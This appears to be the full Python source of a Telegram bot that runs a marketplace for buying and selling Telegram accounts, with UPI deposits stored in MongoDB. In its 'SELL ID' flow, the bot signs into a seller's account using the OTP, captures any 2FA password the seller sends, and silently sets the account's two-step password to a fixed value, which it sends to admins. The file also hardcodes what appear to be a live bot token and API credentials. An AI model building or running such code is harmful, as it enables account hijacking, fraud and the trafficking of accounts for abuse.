import telebot
from telebot import types
from pymongo import MongoClient
from telethon import TelegramClient, functions, types as tel_types
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
import asyncio
import os
import threading
import re
import time
import json
import logging
from flask import Flask

# --- STEP 1: LOGGING & MONITORING ---
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# --- STEP 2: UPTIME SERVER ---
app = Flask('')
@app.route('/')
def home(): return "TITAN CORE V10: FULLY OPERATIONAL"

def run_web():
    app.run(host='0.0.0.0', port=8080)

threading.Thread(target=run_web, daemon=True).start()

# --- STEP 3: CONFIGURATION ---
TOKEN = '8692935006:AAFGFN6aeecPubPdd821zq-CmQnZzMtySsw'
MONGO_URI = "mongodb+srv://your_user:your_password@cluster0.mongodb.net/?retryWrites=true&w=majority"
API_ID = 35155488
API_HASH = '9ee6b40363f94481d48dea8a3a871728'
OWNER_ID = 7634311488

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# --- STEP 4: DATABASE CONNECTION (MONGODB) ---
try:
    mongo_client = MongoClient(MONGO_URI)
    db = mongo_client['titan_premium_db']
    users_col = db['users']
    settings_col = db['settings']
    stock_col = db['stock']
    logger.info("MongoDB Connected Successfully!")
except Exception as e:
    logger.error(f"MongoDB Connection Failed: {e}")

# Global In-Memory Storage for Active Sessions
active_logins = {}

# --- STEP 5: DATABASE HELPERS ---
def get_settings():
    conf = settings_col.find_one({"id": "bot_config"})
    if not conf:
        conf = {
            "id": "bot_config",
            "admins": [OWNER_ID],
            "upi": "abhay-op.315@ptyes",
            "sell_rates": {},
            "buy_rates": {},
            "maintenance": False
        }
        settings_col.insert_one(conf)
    return conf

def get_user_data(uid):
    u = users_col.find_one({"uid": str(uid)})
    if not u:
        u = {"uid": str(uid), "bal": 0, "sold": 0, "bought": 0, "join_date": time.time()}
        users_col.insert_one(u)
    return u

# --- STEP 6: KEYBOARDS (REPLY & INLINE) ---
def get_main_keyboard():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        '💰 BALANCE', '📥 DEPOSIT', 
        '📤 SELL ID', '🛒 BUY ID', 
        '📊 MY STATS', '📞 SUPPORT'
    )
    return markup

# ==========================================
# 👑 ADMIN COMMANDS (COMMAND HANDLERS)
# ==========================================

@bot.message_handler(commands=['admin'])
def admin_portal(m):
    conf = get_settings()
    if m.from_user.id not in conf['admins']: return
    
    msg = (
        "👑 **ADMINISTRATOR CONTROL UNIT**\n\n"
        "📍 `/addcountry [NAME] [BUY] [SELL]`\n"
        "📍 `/addbal [USER_ID] [AMT]`\n"
        "📍 `/set_upi [NEW_UPI]`\n"
        "📍 `/broadcast [MESSAGE]`\n"
        "📍 `/stats_all` (Check Bot health)"
    )
    bot.send_message(m.chat.id, msg)

@bot.message_handler(commands=['addcountry'])
def adm_add_country(m):
    conf = get_settings()
    if m.from_user.id not in conf['admins']: return
    try:
        parts = m.text.split()
        name, b_p, s_p = parts[1].upper(), int(parts[2]), int(parts[3])
        settings_col.update_one({"id": "bot_config"}, {
            "$set": {
                f"buy_rates.{name}": b_p,
                f"sell_rates.{name}": s_p
            }
        })
        bot.reply_to(m, f"✅ **Category Updated:** {name}\nBuy: ₹{b_p} | Sell: ₹{s_p}")
    except Exception as e:
        bot.reply_to(m, "❌ Format: `/addcountry INDIA 40 25`")

# ==========================================
# 💰 USER CORE (MESSAGE HANDLERS)
# ==========================================

@bot.message_handler(commands=['start'])
def start_cmd(m):
    get_user_data(m.from_user.id)
    bot.send_message(m.chat.id, "🔥 **TITAN V10 MONGODB EDITION**\n\nYour data is now secured on Cloud. High-speed transactions active.", reply_markup=get_main_keyboard())

@bot.message_handler(func=lambda m: m.text == '💰 BALANCE')
def bal_msg(m):
    u = get_user_data(m.from_user.id)
    bot.send_message(m.chat.id, f"💳 **Current Balance:** ₹{u['bal']}")

@bot.message_handler(func=lambda m: m.text == '📊 MY STATS')
def stats_msg(m):
    u = get_user_data(m.from_user.id)
    msg = (
        "📊 **ACCOUNT PERFORMANCE**\n\n"
        f"💰 Available Balance: ₹{u['bal']}\n"
        f"📤 Total IDs Sold: {u['sold']}\n"
        f"🛒 Total IDs Bought: {u['bought']}\n"
        f"📅 User Since: {time.strftime('%D', time.gmtime(u['join_date']))}"
    )
    bot.send_message(m.chat.id, msg)

@bot.message_handler(func=lambda m: m.text == '📞 SUPPORT')
def sup_msg(m):
    mk = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("👤 CONTACT OWNER", url="https://t.me/god_abhay"))
    bot.send_message(m.chat.id, "🆘 **Need Help?**\nContact our support team directly.", reply_markup=mk)

# ==========================================
# 📥 DEPOSIT SYSTEM (MULTI-STEP)
# ==========================================

@bot.message_handler(func=lambda m: m.text == '📥 DEPOSIT')
def deposit_init(m):
    msg = bot.send_message(m.chat.id, "💵 **Amount enter karein (₹):**")
    bot.register_next_step_handler(msg, process_deposit_amt)

def process_deposit_amt(m):
    if not m.text.isdigit():
        return bot.send_message(m.chat.id, "❌ Error: Amount sirf numbers mein likho.")
    
    amt = int(m.text)
    conf = get_settings()
    msg = bot.send_message(m.chat.id, f"💳 **Payment Details:**\n\nUPI: `{conf['upi']}`\n\nPay karne ke baad **12-digit UTR/Reference No.** yahan bhejein:")
    bot.register_next_step_handler(msg, process_deposit_utr, amt)

def process_deposit_utr(m, amt):
    utr = m.text.strip()
    if len(utr) < 10:
        return bot.send_message(m.chat.id, "❌ Error: UTR galat lag raha hai.")
    
    msg = bot.send_message(m.chat.id, "📸 **Screenshot Upload karein:**")
    bot.register_next_step_handler(msg, process_deposit_final, amt, utr)

def process_deposit_final(m, amt, utr):
    if m.content_type != 'photo':
        return bot.send_message(m.chat.id, "❌ Error: Photo bhejna compulsory hai.")
    
    conf = get_settings()
    markup = types.InlineKeyboardMarkup().add(
        types.InlineKeyboardButton("✅ APPROVE", callback_data=f"DEP_A_{m.from_user.id}_{amt}"),
        types.InlineKeyboardButton("❌ REJECT", callback_data=f"DEP_R_{m.from_user.id}")
    )
    
    for admin_id in conf['admins']:
        bot.send_photo(admin_id, m.photo[-1].file_id, 
                       caption=f"💰 **NEW DEPOSIT**\nUser: `{m.from_user.id}`\nAmount: ₹{amt}\nUTR: `{utr}`", 
                       reply_markup=markup)
    
    bot.send_message(m.chat.id, "⏳ **Request Sent!** Admin verification ke baad balance add ho jayega.")

# ==========================================
# 📤 SELL ID ENGINE (ASYNC TELETHON)
# ==========================================

@bot.message_handler(func=lambda m: m.text == '📤 SELL ID')
def sell_init(m):
    conf = get_settings()
    if not conf['sell_rates']:
        return bot.send_message(m.chat.id, "⚠️ Market is currently closed.")
    
    mk = types.ReplyKeyboardMarkup(resize_keyboard=True)
    for country in conf['sell_rates']:
        mk.add(f"SELL {country}")
    bot.send_message(m.chat.id, "🌍 **Kaunsi country ki ID hai?**", reply_markup=mk)

@bot.message_handler(func=lambda m: m.text.startswith('SELL '))
def sell_start_login(m):
    country = m.text.replace('SELL ', '')
    msg = bot.send_message(m.chat.id, f"📞 **{country}** ID login ke liye Number (+ format) bhejein:", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, lambda ms: threading.Thread(target=async_login_worker, args=(m.chat.id, ms.text, country)).start())

def async_login_worker(chat_id, phone, country):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH, loop=loop)
    
    async def task():
        await client.connect()
        try:
            req = await client.send_code_request(phone)
            active_logins[chat_id] = {'client': client, 'phone': phone, 'hash': req.phone_code_hash, 'loop': loop, 'country': country}
            bot.send_message(chat_id, "📩 **OTP Bheja gaya hai.** Code enter karein:")
            bot.register_next_step_handler_by_chat_id(chat_id, otp_handler)
        except Exception as e:
            bot.send_message(chat_id, f"❌ Error: {e}")
    
    loop.run_until_complete(task())

def otp_handler(m):
    data = active_logins.get(m.chat.id)
    if not data: return
    
    async def verify():
        client = data['client']
        try:
            await client.sign_in(data['phone'], m.text.strip(), phone_code_hash=data['hash'])
            # AUTO 2FA CHANGE
            try:
                await client(functions.account.UpdatePasswordSettingsRequest(
                    new_settings=tel_types.account.PasswordInputSettings(new_password="2710", hint="TITAN")
                ))
            except: pass
            
            bot.send_message(m.chat.id, "✅ **ID Logged in!** Admin check karke paise add karega.")
            conf = get_settings()
            for a in conf['admins']:
                bot.send_message(a, f"📦 **NEW SELL ID**\nNum: `{data['phone']}`\nCountry: {data['country']}\nPass: 2710")
        except SessionPasswordNeededError:
            bot.send_message(m.chat.id, "🔐 **2FA detected.** Password bhejein:")
            bot.register_next_step_handler_by_chat_id(m.chat.id, pass_handler)
        except Exception as e:
            bot.send_message(m.chat.id, f"❌ Login Failed: {e}")
            
    data['loop'].run_until_complete(verify())

def pass_handler(m):
    data = active_logins.get(m.chat.id)
    async def verify():
        try:
            await data['client'].sign_in(password=m.text.strip())
            bot.send_message(m.chat.id, "✅ **Success with 2FA.**")
        except: bot.send_message(m.chat.id, "❌ Wrong Password.")
    data['loop'].run_until_complete(verify())

# ==========================================
# ⚙️ CALLBACK HANDLER (ADMIN APPROVALS)
# ==========================================

@bot.callback_query_handler(func=lambda call: True)
def master_callback(call):
    p = call.data.split('_')
    
    if p[0] == 'DEP': # Deposit Approval
        target_uid = p[2]
        if p[1] == 'A': # Approve
            amount = int(p[3])
            users_col.update_one({"uid": target_uid}, {"$inc": {"bal": amount}})
            bot.send_message(int(target_uid), f"✅ **Deposit Approved!** ₹{amount} added.")
            bot.edit_message_caption("Status: Approved ✅", call.message.chat.id, call.message.message_id)
        else: # Reject
            bot.send_message(int(target_uid), "❌ **Deposit Rejected.** Contact support.")
            bot.edit_message_caption("Status: Rejected ❌", call.message.chat.id, call.message.message_id)

# --- FINISHING ---
bot.add_custom_filter(custom_filters.StateFilter(bot))
logger.info("Bot is Polling...")
bot.infinity_polling()
